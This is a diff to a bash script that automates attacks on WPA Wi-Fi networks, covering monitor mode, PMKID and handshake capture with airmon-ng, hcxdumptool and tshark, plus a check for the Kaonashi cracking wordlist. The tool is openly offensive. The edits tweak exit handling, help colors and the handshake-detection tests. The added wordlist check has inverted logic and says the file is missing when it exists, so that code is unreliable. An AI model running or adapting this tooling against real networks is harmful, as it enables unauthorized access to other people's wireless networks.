@@ -16,20 +16,21 @@ orange='\033[0;33m'
 purple='\033[0;35m'
 nc='\033[0m' # No Color
 
-echo ""
 
 function exit_script() {
-    echo -e "\n${green}[-]${nc} Taking network card to monitor mode..."
-    sleep 0.5
-    airmon-ng stop ${network_card} &>/dev/null
-    echo -e "${green}[+]${nc} Network card is now in managed mode."
-    # restart network manager
-    echo -e "\n${green}[-]${nc} Restarting network manager..."
-    sleep 0.5
-    service network-manager restart &>/dev/null
-    service NetworkManager restart &>/dev/null
-    service wpa_supplicant restart &>/dev/null
-    echo -e "${green}[+]${nc} Network manager restarted."
+    if [ "$we_attack" = "0" ]; then
+        echo -e "\n${green}[-]${nc} Taking network card to monitor mode..."
+        sleep 0.5
+        airmon-ng stop ${network_card} &>/dev/null
+        echo -e "${green}[+]${nc} Network card is now in managed mode."
+        # restart network manager
+        echo -e "\n${green}[-]${nc} Restarting network manager..."
+        sleep 0.5
+        service network-manager restart &>/dev/null
+        service NetworkManager restart &>/dev/null
+        service wpa_supplicant restart &>/dev/null
+        echo -e "${green}[+]${nc} Network manager restarted."
+    fi
     echo -e "\n${green}[-]${nc} Exiting..."
     tput cnorm; exit 0
 }
@@ -39,15 +40,15 @@ function ctrl_c() {
 }
 
 function help_panel(){
-    echo -e "Usage: $0 ${purple}-a attack_mode ${orange}"
-    echo -e "\t${purple}a) Attack mode"
-    echo -e "\tAvailable attack modes:"
-    echo -e "\t\t${red}PMKID"
+    echo -e "Usage: ${green}$0 ${yellow}-a attack_mode"
+    echo -e "\ta) Attack mode"
+    echo -e "\t${nc}Available attack modes:"
+    echo -e "\t\t${yellow}PMKID"
     echo -e "\t\tHandshake"
     echo -e "\t${blue}h) Help panel"
     echo -e "\tShow this help panel"
 
-    echo -e "\n\t${white}Example: $0 -a PMKID${nc}"
+    echo -e "\n\t${grey}Example: $0 -a PMKID${nc}"
 
     exit_script
 }
@@ -78,6 +79,17 @@ function install_hcxdumptool(){
     make install 1>/dev/null
     cd ..
     rm -rf hcxdumptool &>/dev/null
+}
+
+function check_kaonashi(){
+    if [[ -f /usr/share/wordlists/kaonashiWPA100M.txt ]]; then
+        echo -e "${yellow}[-]${nc} Kaonashi is not in the system"
+        # Download kaonashi
+        sleep 0.5
+    else
+        echo -e "${green}[+]${nc} Kaonashi found"
+        sleep 0.5
+    fi
 }
 
 function dependencies(){
@@ -116,6 +128,8 @@ function dependencies(){
             sleep 0.5
         fi
     done
+    check_kaonashi
+    echo -e "\n${green}[+]${nc} All dependencies are installed"
     sleep 1
 }
 
@@ -148,14 +162,14 @@ function handshake(){
 
     tshark -r capture_${ap_bssid}-01.cap -Y "eapol" 1> handshake.txt 2>/dev/null
 
-    if [[ $(cat handshake.txt | grep "Message 1 of 4" | wc -l) >= "1" ]] && [[ $(cat handshake.txt | grep "Message 2 of 4" | wc -l) >= "1" ]] && [[ $(cat handshake.txt | grep "Message 3 of 4" | wc -l) >= "1" ]] && [[ $(cat handshake.txt | grep "Message 4 of 4" | wc -l) >= "1" ]]; then
+    if [[ $(cat handshake.txt | grep "Message 1 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 2 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 3 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 4 of 4" | wc -l) != "0" ]]; then
         echo -e "${green}[+]${nc} Handshake captured"
         kill -9 $airodump_filter_xterm_pid; wait $airodump_filter_xterm_pid &>/dev/null
     else
         echo -e "${red}[-]${nc} Handshake could not be captured"
         echo -ne "${red}[-]${nc} Send s to stop listen [s]: " && read answer
         tshark -r capture_${ap_bssid}-01.cap -Y "eapol" 1> handshake.txt 2>/dev/null
-        if [[ $(cat handshake.txt | grep "Message 1 of 4" | wc -l) >= "1" ]] && [[ $(cat handshake.txt | grep "Message 2 of 4" | wc -l) >= "1" ]] && [[ $(cat handshake.txt | grep "Message 3 of 4" | wc -l) >= "1" ]] && [[ $(cat handshake.txt | grep "Message 4 of 4" | wc -l) >= "1" ]]; then
+        if [[ $(cat handshake.txt | grep "Message 1 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 2 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 3 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 4 of 4" | wc -l) != "0" ]]; then
             echo -e "${green}[+]${nc} Handshake captured"
         else
             echo -e "${red}[-]${nc} Handshake could not be captured"
@@ -177,7 +191,7 @@ function handshake(){
         fi
     fi
     tshark -r capture_${ap_bssid}-01.cap -Y "eapol" 1> handshake.txt 2>/dev/null
-    if [[ $(cat handshake.txt | grep "Message 1 of 4" | wc -l) >= "1" ]] && [[ $(cat handshake.txt | grep "Message 2 of 4" | wc -l) >= "1" ]] && [[ $(cat handshake.txt | grep "Message 3 of 4" | wc -l) >= "1" ]] && [[ $(cat handshake.txt | grep "Message 4 of 4" | wc -l) >= "1" ]]; then
+    if [[ $(cat handshake.txt | grep "Message 1 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 2 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 3 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 4 of 4" | wc -l) != "0" ]]; then
         mkdir -p handshakes
         mv capture_* handshakes/
 
@@ -235,6 +249,7 @@ function pmkid(){
 }
 
 function attack(){
+    we_attack=0
     clear
 
     choose_card
@@ -282,6 +297,8 @@ function choose_card(){
 # Main function
 
 tput civis
+we_attack=1
+echo ""
 while getopts ":a:h" arg; do
     case $arg in
         a) attack_mode=$OPTARG ;;
